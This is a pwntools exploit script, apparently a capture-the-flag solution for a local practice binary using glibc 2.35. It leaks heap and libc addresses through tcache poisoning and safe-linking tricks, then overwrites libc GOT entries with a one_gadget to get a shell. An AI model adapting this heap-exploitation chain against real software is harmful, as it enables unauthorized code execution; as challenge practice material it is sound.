#!/usr/bin/env python3
from pwn import *

elf = ELF('./vuln')
libc = ELF('./libc.so.6')
ld = ELF('./ld-2.35.so')
context.update(binary=elf, log_level='DEBUG')
p = elf.process()
gdb.attach(p, '''
    b *main+64
    b *main+215
    # x/20gx &mlist
    ''')

def Edit(idx, size, data=b''):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendlineafter(b'Size: ', str(int(size)).encode())
    if int(size) != 0:
        p.sendafter(b'Memo: ', data)
    else:
        return

def List():
    p.sendlineafter(b'> ', b'2')
    leak = p.recvuntil(b'MENU')
    leak = leak.split(b'\n')
    return leak

#[1] leak heap
Edit(0, 0x78, b'A'*0x10)
Edit(0, 0, 0)
Edit(1, 0x78, b'B'*0x10)
Edit(0, 0, 0)
leak = List()
leak = leak[0].split(b' ')
leak = leak[1][::-1].hex()
tcache_perthread_struct = int(leak, 16) << 12
firt_chunk = tcache_perthread_struct + 0x290
log.info('Address tcache_perthread_struct: ' + hex(tcache_perthread_struct))
log.info('Address firt_chunk:              ' + hex(firt_chunk))

#[2] leak libc
Edit(1, 0x78, p64(0)*2)
Edit(0, 0, 0)
fd_fake = ((firt_chunk + 0x10) >> 12) ^ (tcache_perthread_struct+0x10)
Edit(1, 0x78, p64(fd_fake) + p64(0))
Edit(2, 0x78, b"A" * 8)

# create unsorted bins in chunk tcache_perthread_struct
# tcache[0x290] = 7
Edit(3,0x78,p16(7)*58)       # pop mlist[3] ra khỏi tcachebin[0x290]
Edit(3,0x78,p16(0)*6+p16(7)) # realloc(tcache,0x78)

Edit(4,0x68,p64(0)*6+p64(tcache_perthread_struct+0x160))
Edit(5,0x78,b"X")

# overlap unsortedbins vaf mlist[5]
Edit(6, 0x58, b"A")
leak = List()
leak = leak[4].split(b' ')
leak = leak[1][::-1].hex()
libc.address = int(leak, 16) - 0x219ce0
log.info('Address libc base:              ' + hex(libc.address))

#[3] getshell overwrite ABS GOT LIBC => one_gadget
puts_abs_got=libc.address+0x219098
realloc_abs_got=libc.address+0x219160
Edit(3,0x78,p16(0)*6+p16(7))
Edit(4,0x68,p64(0)*6+p64(realloc_abs_got))
Edit(7,0x78,p64(libc.address+0xebcf8))

Edit(4,0x68,p64(0)*6+p64(puts_abs_got-8))
Edit(8,0x78,p64(0)+p64(libc.sym.realloc+1153))

p.interactive()


# Edit(0, 0x10, b'A')
# Edit(1, 0x20, b'B')
# Edit(2, 0x30, b'C')
# Edit(3, 0x40, b'D')
# Edit(0, 0, 0)
# Edit(1, 0, 0)
# Edit(2, 0, 0)